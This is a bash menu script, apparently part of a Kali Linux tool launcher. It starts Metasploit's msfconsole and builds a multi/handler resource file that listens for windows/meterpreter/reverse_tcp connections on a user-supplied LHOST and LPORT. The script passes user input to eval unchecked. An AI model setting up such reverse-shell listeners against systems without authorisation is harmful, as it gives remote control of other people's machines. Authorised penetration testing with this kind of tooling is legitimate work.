#!/bin/bash

source kp.conf
source $MODULES_PATH/misc_module.sh
source $TOOL_PATH/32_kp_msfpc.sh

function menu_metasploit(){
	clear
	figlet Metasploit
    num1 0 " Kali-tools-top10"
    num1 5 " metasploit-framework"
    num1 10 " Normal_Boot"
    num2 10 " Create_Multi_handler" " (windows/meterpreter/reverse_tcp)"
    num3 10 " Create_Payload" " (msfpc)"
    num9 10 " Back"
	read -n 1 -s NUM
    echo ""
    case $NUM in
    1)
        cmd_metasploit1
        ;;
    2)
        cmd_metasploit2
        ;;
	3)
		cmd_msfpc
		;;
    9)
        kalitoolstop10_menu1
        ;;
    *)
        ;;
    esac
}

function cmd_metasploit1(){
    local cmd="" ANS="" RESOURCE=""
	clear
	figlet Metasploit
    cmd="msfconsole"
    printf "┌─(${PURPLE}$TITLE${NC})${RED}${USERNAME}@${HOSTNAME}${NC}:${RED}[1]Kali-tools-top10${NC} > ${RED}[1]metasploit-framework${NC} > ${RED}[1]Normal Boot${NC}\n"
    printf "+${BLUE}Options${NC}:\n"
    printf "|  ${YELLOW}-q, --quiet${NC}                      Do not print the banner on startup\n"
    printf "|  ${YELLOW}-r, --resource FILE${NC}              Execute the specified resource file (- for stdin)\n"
    printf "|  ${YELLOW}-h, --help${NC}                       Show this message\n"
    echo "> Select Boot style"
    num1 0 "Normal"
    num2 0 "Quiet"
    num3 0 "resource"
    num4 0 "Help"
    read -n 1 -s ANS
    case $ANS in
    1)
        cmd="msfconsole"
        ;;
    2)
        cmd="msfconsole -q"
        ;;
    3)
        read -e -p "> Input resource file path: " RESOURCE
        cmd="msfconsole -r ${RESOURCE}"
        ;;
    4)
        cmd="msfconsole -h"
        ;;
    esac
    printf "+${BLUE}usage${NC} :Usage: msfconsole ${WHITE}[options]${NC}\n"
    echo "└─Command > $cmd"
    echo ""
    echo "> You ready?"
    num1 0 "No"
    num2 0 "Yes"
    read -n 1 -s ANS
    if [ ! -z "$ANS" ];then
        if [ $ANS = "2" ];then
            eval $cmd
        else
            :
        fi
    else
        :
    fi
}

function cmd_metasploit2(){
    local LHOST="" LPORT="" cmd="" ANS=""
	clear
	figlet Metasploit
    cmd="msfconsole"
    printf "┌─(${PURPLE}$TITLE${NC})${RED}${USERNAME}@${HOSTNAME}${NC}:${RED}[1]Kali-tools-top10${NC} > ${RED}[1]metasploit-framework${NC} > ${GREEN}[2]Create Multi Handler${NC}\n"
    echo "> Create handler..."
    read -p "> Input Local host <IP Address>: " LHOST
    echo "|"
    read -p "> Input Local Port: " LPORT
    cat <<EOF >> resouce.rc
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
exploit
EOF
    echo "|"
    printf "+  ${YELLOW}PAYLOAD${NC}: windows/meterpreter/reverse_tcp\n"
    printf "+  ${YELLOW}LHOST${NC}  : $LHOST\n"
    printf "+  ${YELLOW}LPORT${NC}  : $LPORT\n"
    cmd+=" -r resouce.rc"
    echo "└─Command > $cmd"
    echo ""
    echo "> You ready?"
    num1 0 "No"
    num2 0 "Yes"
    read -n 1 -s ANS
    if [ ! -z "$ANS" ];then
        if [ $ANS = "2" ];then
            eval $cmd
        else
            :
        fi
    else
        :
    fi
    rm resouce.rc
}

